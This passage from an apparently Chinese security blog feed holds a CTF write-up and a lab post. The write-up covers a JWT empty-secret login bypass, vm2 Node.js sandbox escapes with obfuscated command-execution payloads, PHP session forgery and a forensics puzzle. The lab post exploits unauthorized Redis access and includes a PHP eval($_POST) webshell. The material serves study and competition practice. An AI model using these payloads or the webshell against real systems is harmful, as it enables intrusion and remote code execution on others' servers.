class="line">        global.secrets.push(secret)</span><br><span class="line"></span><br><span class="line">        const token &#x3D; jwt.sign(&#123;secretid, username, password&#125;, secret, &#123;algorithm: &#39;HS256&#39;&#125;);</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            token: token</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br><span class="line"></span><br><span class="line">    &#39;POST &#x2F;api&#x2F;login&#39;: async (ctx, next) &#x3D;&gt; &#123;</span><br><span class="line">        const &#123;username, password&#125; &#x3D; ctx.request.body;</span><br><span class="line"></span><br><span class="line">        if(!username || !password) &#123;</span><br><span class="line">            throw new APIError(&#39;login error&#39;, &#39;username or password is necessary&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const token &#x3D; ctx.header.authorization || ctx.request.body.authorization || ctx.request.query.authorization;</span><br><span class="line"></span><br><span class="line">        const sid &#x3D; JSON.parse(Buffer.from(token.split(&#39;.&#39;)[1], &#39;base64&#39;).toString()).secretid;</span><br><span class="line"></span><br><span class="line">        console.log(sid)</span><br><span class="line"></span><br><span class="line">        if(sid &#x3D;&#x3D;&#x3D; undefined || sid &#x3D;&#x3D;&#x3D; null || !(sid &lt; global.secrets.length &amp;&amp; sid &gt;&#x3D; 0)) &#123;</span><br><span class="line">            throw new APIError(&#39;login error&#39;, &#39;no such secret id&#39;);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        const secret &#x3D; global.secrets[sid];</span><br><span class="line"></span><br><span class="line">        const user &#x3D; jwt.verify(token, secret, &#123;algorithm: &#39;HS256&#39;&#125;);</span><br><span class="line"></span><br><span class="line">        const status &#x3D; username &#x3D;&#x3D;&#x3D; user.username &amp;&amp; password &#x3D;&#x3D;&#x3D; user.password;</span><br><span class="line"></span><br><span class="line">        if(status) &#123;</span><br><span class="line">            ctx.session.username &#x3D; username;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        ctx.rest(&#123;</span><br><span class="line">            status</span><br><span class="line">        &#125;);</span><br><span class="line"></span><br><span class="line">        await next();</span><br><span class="line">    &#125;,</span><br></pre></td></tr></table></figure><p>大致是注册的时候生成一个secret，添加到全局数据中，用于加密账号和密码生成jwttoken，登录的时候根据token里面的sid参数获取secret解密判断账号密码是否正确，这里可以采取数组绕过+空加密登录。payload如下</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200419193156231.png" alt="image-20200419193156231"></p><p>注册一个用户获取session，登录抓包修改token登录</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200419193351610.png" alt="image-20200419193351610"></p><p>然后访问/api/flag得到flag</p><p>本题来源于ev0a师傅的unctf出题，当时没做。。。<a href="https://evoa.me/index.php/archives/60/" target="_blank" rel="noopener">https://evoa.me/index.php/archives/60/</a></p><h3 id="0x-02-JustEscape"><a href="#0x-02-JustEscape" class="headerlink" title="0x 02  JustEscape"></a>0x 02  JustEscape</h3><p>考点是nodejs沙箱逃逸，通过测试语言的产生异常的代码进行fuzz，使得后端抛出异常，发现后端是NodeJS + vm2,payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">(function()&#123;</span><br><span class="line">var err &#x3D; new Error();</span><br><span class="line">return err.stack;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200420142723612.png" alt>接下来是到vm2 的仓库里查找一下逃逸相关的 issue</p><p>code存在过滤，数组可以绕过</p><p>逃逸的exp可以在<a href="https://github.com/patriksimek/vm2/issues/225获得" target="_blank" rel="noopener">https://github.com/patriksimek/vm2/issues/225获得</a></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">try&#123;</span><br><span class="line">        Buffer.from(new Proxy(&#123;&#125;, &#123;</span><br><span class="line">            getOwnPropertyDescriptor()&#123;</span><br><span class="line">                throw f&#x3D;&gt;f.constructor(&quot;return process&quot;)();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;));</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e(()&#x3D;&gt;&#123;&#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;whoami&quot;).toString();</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>发现return报错，去掉后执行成功</p><p>过滤的地方可以利用反引号来把文本括起来作为字符串 <a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings，同时我们也可以利用模板字符串嵌套来拼接出我们想要的被过滤了的字符串" target="_blank" rel="noopener">https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/template_strings，同时我们也可以利用模板字符串嵌套来拼接出我们想要的被过滤了的字符串</a></p><p>比如这里 prototype 被过滤了，我们可以这样书写 </p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;</span><br></pre></td></tr></table></figure><p>贴一下payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">(function ()&#123;</span><br><span class="line">    TypeError[&#96;$&#123;&#96;$&#123;&#96;prototyp&#96;&#125;e&#96;&#125;&#96;][&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;] &#x3D; f&#x3D;&gt;f[&#96;$&#123;&#96;$&#123;&#96;constructo&#96;&#125;r&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;return this.proces&#96;&#125;s&#96;&#125;&#96;)();</span><br><span class="line">    try&#123;</span><br><span class="line">        Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1;</span><br><span class="line">    &#125;catch(e)&#123;</span><br><span class="line">        return e[&#96;$&#123;&#96;$&#123;&#96;get_proces&#96;&#125;s&#96;&#125;&#96;](()&#x3D;&gt;&#123;&#125;).mainModule[&#96;$&#123;&#96;$&#123;&#96;requir&#96;&#125;e&#96;&#125;&#96;](&#96;$&#123;&#96;$&#123;&#96;child_proces&#96;&#125;s&#96;&#125;&#96;)[&#96;$&#123;&#96;$&#123;&#96;exe&#96;&#125;cSync&#96;&#125;&#96;](&#96;whoami&#96;).toString();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;)()</span><br></pre></td></tr></table></figure><p>看了chamd5的师傅知道了还可以用字符串拆分和base64编码绕过过滤</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">TypeError.prototype.get_process &#x3D; f &#x3D;&gt; f.constructor(&quot;return process&quot;)();</span><br><span class="line">try &#123;</span><br><span class="line">    Object.preventExtensions(Buffer.from(&quot;&quot;)).a &#x3D; 1;</span><br><span class="line">&#125; catch (e) &#123;</span><br><span class="line">    e.get_process(() &#x3D;&gt; &#123; &#125;).mainModule.require(&quot;child_process&quot;).execSync(&quot;cat &#x2F;flag&quot;).toString();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>base64编码绕过：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">global[[&#96;eva&#96;,%20&#96;l&#96;].join(&#96;&#96;)](Buffer.from(&#96;VHlwZUVycm9yLnByb3RvdHlwZS5nZXRfcHJvY2VzcyA9IGYgPT4gZi5jb25zdHJ1Y3RvcigicmV0dXJuIHByb2Nlc3MiKSgpOwp0cnkgewogICAgT2JqZWN0LnByZXZlbnRFeHRlbnNpb25zKEJ1ZmZlci5mcm9tKCIiKSkuYSA9IDE7Cn0gY2F0Y2ggKGUpIHsKICAgIGUuZ2V0X3Byb2Nlc3MoKCkgPT4geyB9KS5tYWluTW9kdWxlLnJlcXVpcmUoImNoaWxkX3Byb2Nlc3MiKS5leGVjU3luYygiY2F0IC9mbGFnIikudG9TdHJpbmcoKTsKfQ&#x3D;&#x3D;&#96;,%20&#96;base64&#96;).toString(&#96;ascii&#96;));</span><br></pre></td></tr></table></figure><p>第一种方法的hex编码绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?code&#x3D;(function()&#123;TypeError[String.fromCharCode(112,114,111,116,111,116,121,112,101)][&#96;\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73&#96;] &#x3D; f&#x3D;&gt;f[&#96;\x63\x6f\x6e\x73\x74\x72\x75\x63\x74\x6f\x72&#96;](&#96;\x72\x65\x74\x75\x72\x6e\x20\x70\x72\x6f\x63\x65\x73\x73&#96;)();try&#123;Object.preventExtensions(Buffer.from(&#96;&#96;)).a &#x3D; 1;&#125;catch(e)&#123;return e[&#96;\x67\x65\x74\x5f\x70\x72\x6f\x63\x65\x73\x73&#96;](()&#x3D;&gt;&#123;&#125;).mainModule.require((&#96;\x63\x68\x69\x6c\x64\x5f\x70\x72\x6f\x63\x65\x73\x73&#96;))[&#96;\x65\x78\x65\x63\x53\x79\x6e\x63&#96;](&#96;cat &#x2F;flag&#96;).toString();&#125;&#125;)()</span><br></pre></td></tr></table></figure><p>第二种方法的hex编码绕过方法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(function()%7B%0A%09try%7B%0A%09%09Buffer.from(new%20Proxy(%7B%7D%2C%20%7B%0A%09%09%09getOwnPropertyDescriptor()%7B%0A%09%09%09%09throw%20f%3D%3Ef%5B%60%5Cx63%5Cx6f%5Cx6e%5Cx73%5Cx74%5Cx72%5Cx75%5Cx63%5Cx74%5Cx6f%5Cx72%60%5D(%60%5Cx72%5Cx65%5Cx74%5Cx75%5Cx72%5Cx6e%5Cx20%5Cx70%5Cx72%5Cx6f%5Cx63%5Cx65%5Cx73%5Cx73%60)()%3B%0A%09%09%09%7D%0A%09%09%7D))%3B%0A%09%7Dcatch(e)%7B%0A%09%09return%20e(()%3D%3E%7B%7D).mainModule.require(%60%5Cx63%5Cx68%5Cx69%5Cx6c%5Cx64%5Cx5f%5Cx70%5Cx72%5Cx6f%5Cx63%5Cx65%5Cx73%5Cx73%60)%5B%60%5Cx65%5Cx78%5Cx65%5Cx63%5Cx53%5Cx79%5Cx6e%5Cx63%60%5D(%60cat%20%2Fflag%60).toString()%3B%0A%09%7D%0A%7D()</span><br></pre></td></tr></table></figure><p>贴一下链接：<a href="https://mp.weixin.qq.com/s?__biz=MzIzMTc1MjExOQ==&mid=2247486804&idx=1&sn=2a7cff6961849e562b9d0c93af425976&chksm=e89e258cdfe9ac9abdd7867b19795de6bcb2b508b56f3f608283d77f3ae1d70837060a959769&mpshare=1&scene=23&srcid=&sharer_sharetime=1587452651285&sharer_shareid=7fa312c2aff8bd738bf9d331ff765678#rd" target="_blank" rel="noopener">数字中国创新大赛-虎符网络安全赛道Write up</a></p><h3 id="0x-03-Babyupload"><a href="#0x-03-Babyupload" class="headerlink" title="0x 03 Babyupload"></a>0x 03 Babyupload</h3><p>本题需要伪造session，首先使用download功能查看当前的session</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200420145648294.png" alt></p><p>结果如下：</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200420145727579.png" alt></p><p>发现其 session 处理器为 php_binary，本地生成一下session文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">ini_set(&#39;session.serialize_handler&#39;, &#39;php_binary&#39;);</span><br><span class="line">session_start();</span><br><span class="line">$_SESSION[&#39;username&#39;] &#x3D; &#39;admin&#39;;</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200420152113464.png" alt></p><p>计算文件的sha256 摘要值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">echo hash_file(&#39;sha256&#39;, &#39;sess&#39;)</span><br></pre></td></tr></table></figure><p>得到<code>432b8b09e30c4a75986b719d1312b63a69f1b833ab602c9ad5f0299d1d76a5a4</code></p><p>接下来是绕过file_exists，文档中的定义是<em>检查文件或目录是否存在</em>，所以我们可以创建一个success.txt目录来绕过</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200420152440813.png" alt></p><p>参考资料：</p><blockquote><p> <a href="https://www.zhaoj.in/read-6512.html" target="_blank" rel="noopener">https://www.zhaoj.in/read-6512.html</a></p><p><a href="https://p3rh4ps.top/index.php/2020/04/19/%e8%99%8e%e7%ac%a6ctf-web-wp/" target="_blank" rel="noopener">https://p3rh4ps.top/index.php/2020/04/19/%e8%99%8e%e7%ac%a6ctf-web-wp/</a></p></blockquote><h3 id="MISC"><a href="#MISC" class="headerlink" title="MISC"></a>MISC</h3><h4 id="0x-01-奇怪的组织"><a href="#0x-01-奇怪的组织" class="headerlink" title="0x 01 奇怪的组织"></a>0x 01 奇怪的组织</h4><ul><li>题目描述</li></ul><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421180925473.png" alt></p><ul><li>解题过程</li></ul><blockquote><p>题目附件：<a href="https://pan.baidu.com/s/1LA4MrUUFUGLe49eTuWdLDw" target="_blank" rel="noopener">附件下载</a> 提取码：(yzsa)</p><p>本题用得到的取证工具为<strong>MAGNET AXIOM</strong>，下载地址：<a href="https://pan.baidu.com/s/1pVuwFXvo2CoV5nC66kI_GQ" target="_blank" rel="noopener">软件下载</a>提取码：(5qqp)，推荐使用取证大师，能够检索的信息更多一些，可以在官方微信公众号联系客服获取试用版本</p></blockquote><p>题目下载下来解压发现是Windows系统中C盘文件夹，使用<strong>MAGNET AXIOM</strong>工具添加案例进行分析（PS：这软件贼吉尔大，使用时候占用资源贼鸡儿多</p><p>首先查看安装程序文件夹，可以发现存在<code>phpstudy</code>、<code>Firefox</code>、<code>MicrosoftEdge</code>、<code>maili</code>、<code>xshell</code>、<code>notepad++</code>等程序</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421204111450.png" alt></p><p>跟进phpstudy内分析发现安装有织梦cms文件，应该是本地搭建的网站</p><p>接着查看用户应用数据目录（相对路径为Thunder\Users\bob\AppData\Local），发现存在Firefox、MicrosoftEdge和Thunderbird软件的数据文件，那么首先分析用户的浏览记录，将过滤器设置为Firefox网络历史记录，得到结果如下：</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421184315903.png" alt></p><p>对访问记录进行分析，我们会发现该用户在11月28号的记录中可以看到访问了很多和emoji有关的网站，其中最可疑的网站是<a href="https://codemoji.org/，我们访问后发现这是一个使用emoji表情来加密文本的在线加密网站，同时根据网站提示发现网站生成密文的时候也会生成一个短连接用于分享密文信息和解密" target="_blank" rel="noopener">https://codemoji.org/，我们访问后发现这是一个使用emoji表情来加密文本的在线加密网站，同时根据网站提示发现网站生成密文的时候也会生成一个短连接用于分享密文信息和解密</a></p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421184451314.png" alt></p><p>观察分享的链接格式我们可以找到历史记录里面的一个短连接</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421184622325.png" alt></p><p>我们访问这个链接发现用到一个emoji表情作为密钥进行解密，翻找前后的浏览记录，我们可以发现这样两条记录</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421184900755.png" alt></p><p>我们尝试使用龙的emoji表情进行解密，成功解密得到明文</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421185354453.png" alt></p><p>接下来分析IE浏览器的使用记录</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421203223465.png" alt></p><p>发现用户访问了如下页面</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1/dede/a/Blog/2019/1130/4.html</span><br></pre></td></tr></table></figure><p>对应文件夹的路径如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thunder\phpstudy_pro\WWW\dede\a\Blog\2019\1130</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421203518078.png" alt></p><p>猜测得到的信息应该是AES或者DES加密过的</p><p>接下来查看Thunderbird软件的数据文件，将过滤器选择为EML(X)文件，翻阅邮件记录，根据时间顺序提取出来三个短连接，分别解密结果如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;mzl.la&#x2F;37QeQ4v</span><br><span class="line">解得：haha, now we can chat!</span><br><span class="line">https:&#x2F;&#x2F;mzl.la&#x2F;2L5ZfnD</span><br><span class="line">解得：yeah, maybe... let me think ...</span><br><span class="line">https:&#x2F;&#x2F;mzl.la&#x2F;2svfAf5</span><br><span class="line">解得：aha, this way is safe!Remember my real name!</span><br></pre></td></tr></table></figure><p>另外我们在邮件中还发现存在内容单独的emoji的邮件，缺少对应可以解密的短连接，如下：</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421195719878.png" alt></p><p>这里我们还可以找到另一种关于emoji的加密方式，<code>emoji-aes</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https:&#x2F;&#x2F;aghorler.github.io&#x2F;emoji-aes&#x2F;</span><br></pre></td></tr></table></figure><p>但是也需要密钥，这个密钥不支持emoji输入。</p><p>回过头来，根据对话的信息提示：<code>真实姓名</code>，而在<code>Thunder\Users\bob\Pictures\Camera Roll</code>发现sdcard文件夹，sdcard即手机的储存卡导出文件夹，再联系到需要寻找真名，想到手机通讯录，而通讯录的文件为<code>.vcf</code>格式，在文件夹中搜索<code>.vcf</code>文件，可以找到out.vcf文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Thunder\Users\bob\Pictures\Camera Roll\sdcard\Android\data\com.android.backup\files\pending_blobs</span><br></pre></td></tr></table></figure><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421194702799.png" alt></p><p>根据这篇文章查看vcf文件内容：<a href="https://jingyan.baidu.com/article/3aed632e30b0f1701080918a.html，，可以发现只有`matachuan`这一个用户拥有邮箱信息，而且**real" target="_blank" rel="noopener">https://jingyan.baidu.com/article/3aed632e30b0f1701080918a.html，，可以发现只有`matachuan`这一个用户拥有邮箱信息，而且**real</a> name**那封邮件正是从<a href="mailto:rjddd321@protonmail.com">rjddd321@protonmail.com</a>发来的，也就是说matachuan就是他的真名</p><p>尝试以matachuan为key解密邮件中的emoji-aes，可以得到以下几条信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">这个还能加密中文呢，无敌了</span><br><span class="line">那你把后台账户发我吧</span><br><span class="line">admin admin</span><br><span class="line">帮你传了点东西，以后你写博客应该用的到</span><br><span class="line">好的，我一会上去看一看，对了，组织的暗号已经换了，“GxD1r”</span><br></pre></td></tr></table></figure><p>根据提示的信息可以得到该用户登录了dedecms后台，并且上传了秘密文件，另外一个是可能是某种加密的密钥为<code>GxD1r</code>，回过结合dedecms里面可疑的加密信息，尝试使用AES解密成功</p><p><img src="/2020/04/19/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B%E5%A4%8D%E7%9B%98/image-20200421203837476.png" alt></p><p>参考资料：</p><blockquote><p><a href="http://www.ga1axy.top/index.php/archives/25/" target="_blank" rel="noopener">http://www.ga1axy.top/index.php/archives/25/</a></p><p><a href="https://blog.xiafeng2333.top/ctf-30/#" target="_blank" rel="noopener">https://blog.xiafeng2333.top/ctf-30/#</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h3&gt;&lt;p&gt;最近状态太低迷，哎，难受的鸭皮&lt;/p&gt;
&lt;h3 id=&quot;WEB&quot;&gt;&lt;a href=&quot;#WEB&quot; class=&quot;headerlink&quot; tit
      
    
    </summary>
    
    
      <category term="ctfwp" scheme="http://yoursite.com/categories/ctfwp/"/>
    
    
      <category term="虎符网络安全大赛" scheme="http://yoursite.com/tags/%E8%99%8E%E7%AC%A6%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8%E5%A4%A7%E8%B5%9B/"/>
    
  </entry>
  
  <entry>
    <title>Redis未授权访问漏洞复现与利用</title>
    <link href="http://yoursite.com/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/"/>
    <id>http://yoursite.com/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/</id>
    <published>2020-04-18T03:50:17.000Z</published>
    <updated>2020-04-18T04:07:25.034Z</updated>
    
    <content type="html"><![CDATA[<h3 id="0x-01-漏洞简介以及危害"><a href="#0x-01-漏洞简介以及危害" class="headerlink" title="0x 01 漏洞简介以及危害"></a>0x 01 漏洞简介以及危害</h3><ul><li>漏洞简介</li></ul><p>​        Redis 默认情况下，会绑定在 0.0.0.0:6379，如果没有进行采用相关的策略，比如添加防火墙规则避免其他非信任来源 ip 访问等，这样将会将 Redis  服务暴露到公网上，如果在没有设置密码认证（一般为空）的情况下，会导致任意用户在可以访问目标服务器的情况下未授权访问 Redis 以及读取  Redis 的数据。攻击者在未授权访问 Redis 的情况下，利用 Redis 自身的提供的config 命令，可以进行写文件操作，攻击者可以成功将自己的ssh公钥写入目标服务器的 /root/.ssh 文件夹的authotrized_keys 文件中，进而可以使用对应私钥直接使用ssh服务登录目标服务器。</p><p>简单说，漏洞的产生条件有以下两点：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">（1）redis绑定在 0.0.0.0:6379，且没有进行添加防火墙规则避免其他非信任来源ip访问等相关安全策略，直接暴露在公网；</span><br><span class="line">（2）没有设置密码认证（一般为空），可以免密码远程登录redis服务。</span><br></pre></td></tr></table></figure><ul><li>漏洞危害</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">（1）攻击者无需认证访问到内部数据，可能导致敏感信息泄露，黑客也可以恶意执行flushall来清空所有数据；</span><br><span class="line">（2）攻击者可通过EVAL执行lua代码，或通过数据备份功能往磁盘写入后门文件；</span><br><span class="line">（3）最严重的情况，如果Redis以root身份运行，黑客可以给root账户写入SSH公钥文件，直接通过SSH登录受害服务器</span><br></pre></td></tr></table></figure><h3 id="0x-02-漏洞复现"><a href="#0x-02-漏洞复现" class="headerlink" title="0x 02 漏洞复现"></a>0x 02 漏洞复现</h3><p>参考这篇文章搭建复现环境：<a href="https://www.cnblogs.com/bmjoker/p/9548962.html" target="_blank" rel="noopener">10.Redis未授权访问漏洞复现与利用</a></p><p>攻击机ip地址：192.168.194.132（本机虚拟机）</p><p>靶机IP地址：47.96.150.181（公网服务器）</p><h3 id="0x-03-未授权访问漏洞测试"><a href="#0x-03-未授权访问漏洞测试" class="headerlink" title="0x 03 未授权访问漏洞测试"></a>0x 03 未授权访问漏洞测试</h3><ul><li>验证漏洞存在</li></ul><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418115921434.png" alt></p><h4 id="3-1-利用redis写webshell"><a href="#3-1-利用redis写webshell" class="headerlink" title="3.1 利用redis写webshell"></a>3.1 利用redis写webshell</h4><p>利用前提：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">1.靶机redis链接未授权，在攻击机上能用redis-cli连上，如上图，并未登陆验证</span><br><span class="line">2.开了web服务器，并且知道路径（如利用phpinfo，或者错误爆路经），还需要具有文件读写增删改查权限（我们可以将dir设置为一个目录a，而dbfilename为文件名b，再执行save或bgsave，则我们就可以写入一个路径为a&#x2F;b的任意文件。）</span><br></pre></td></tr></table></figure><p>我们尝试把shell写入/var/www/html目录下：</p><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418120207512.png" alt></p><p>靶机查看是否写入成功</p><p><img src="/2020/04/18/Redis%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%A9%E7%94%A8/image-20200418120256926.png" alt></p><p>成功写入shell。</p><p>当数据库过大时，redis写shell的小技巧：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">set_time_limit(0);</span><br><span class="line">$fp&#x3D;fopen(&#39;bmjoker.php&#39;,&#39;w&#39;);</span><br><span class="line">fwrite($fp,&#39;&lt;?php @eval($_POST[\&quot;bmjoker\&quot;]);?&gt;&#39;);</span><br><span class="line">exit();</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><h4 id="3-2-利用”公私钥”认证获取root权限"><a href="#3-2-利用”公私钥”认证获取root权限" class="headerlink" title="3.2 利用”公私钥”认证获取root权限"></a>3.2 利用”公私钥”认证获取root权限</h4>]]></content>
    
    <summary type="html">
    
      
      
